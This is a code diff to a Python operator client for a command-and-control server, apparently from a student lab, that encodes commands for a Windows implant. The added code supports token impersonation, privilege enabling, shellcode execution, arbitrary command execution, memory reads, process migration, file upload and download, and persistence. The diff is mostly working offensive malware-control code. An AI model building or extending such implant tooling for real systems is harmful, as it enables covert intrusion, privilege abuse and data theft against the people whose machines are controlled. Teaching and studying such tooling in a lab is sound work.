@@ -1,3 +1,4 @@
+import os
 import socket
 import struct
 
@@ -21,7 +22,7 @@ from protocol import (
 )
 
 C2_HOST = "127.0.0.1"
-C2_PORT = 9002
+C2_PORT = 9002 
 
 TASK_STATE_NAMES = {
     TASK_STATE_QUEUED_CODE: "queued",
@@ -38,14 +39,65 @@ def encode_arg_bytes(cmd_name, arg):
     """
     Convert operator input into the binary argument format expected by the
     implant.
-
-    Students generally should not need to modify this unless the lab changes
-    the request format.
     """
-    if cmd_name in {"process-token", "token-privileges", "impersonate-token"}:
-        return struct.pack("<I", int(arg, 10))
-    if cmd_name == "enable-privilege":
+    # Commands with one integer argument
+    if cmd_name in {"process-token", "token-privileges", "token-impersonate", "modulelist", "handlelist", "sleep", "migrate"}:
+        if not arg:
+            return struct.pack("<I", 0)
+        return struct.pack("<I", int(arg, 0))
+
+    # Commands with one string argument (UTF-8)
+    if cmd_name in {"enable-privilege", "disable-privilege", "exec", "shellcodeexec", "getenv"}:
         return arg.encode("utf-8")
+
+    # Commands with one string argument (UTF-16LE for Windows Filesystem APIs)
+    if cmd_name in {"ls", "cat", "mkdir", "rm"}:
+        return arg.encode("utf-16le")
+
+    # Special case: memread <address> <size>
+    if cmd_name == "memread":
+        parts = arg.split()
+        if len(parts) != 2:
+            raise ValueError("memread requires <address> and <size>")
+        addr = int(parts[0], 0)
+        size = int(parts[1], 10)
+        return struct.pack("<QI", addr, size)
+
+    # Special case: setenv <var_name> <value>
+    if cmd_name == "setenv":
+        parts = arg.split(None, 1)
+        if len(parts) != 2:
+            raise ValueError("setenv requires <var_name> and <value>")
+        name = parts[0].encode("utf-8")
+        val = parts[1].encode("utf-8")
+        return struct.pack("<I", len(name)) + name + struct.pack("<I", len(val)) + val
+
+    # Special case: upload <local_path> <remote_path>
+    if cmd_name == "upload":
+        parts = arg.split(None, 1)
+        if len(parts) != 2:
+            raise ValueError("upload requires <local_path> and <remote_path>")
+        local_path, remote_path = parts
+        if not os.path.exists(local_path):
+            raise ValueError(f"Local file not found: {local_path}")
+        with open(local_path, "rb") as f:
+            data = f.read()
+        remote_path_bytes = remote_path.encode("utf-16le")
+        return struct.pack("<I", len(remote_path_bytes)) + remote_path_bytes + struct.pack("<I", len(data)) + data
+
+    # Special case: download <remote_path> <local_path>
+    if cmd_name == "download":
+        parts = arg.split(None, 1)
+        if not parts:
+            raise ValueError("download requires <remote_path>")
+        remote_path = parts[0]
+        # Note: local_path is typically handled by the UI when results arrive
+        return remote_path.encode("utf-16le")
+
+    # Commands with no arguments
+    if cmd_name in {"kill", "inspect-token", "ps", "whoami", "hostname", "getpid", "env", "persist", "unpersist"}:
+        return b""
+
     return b""
 
 
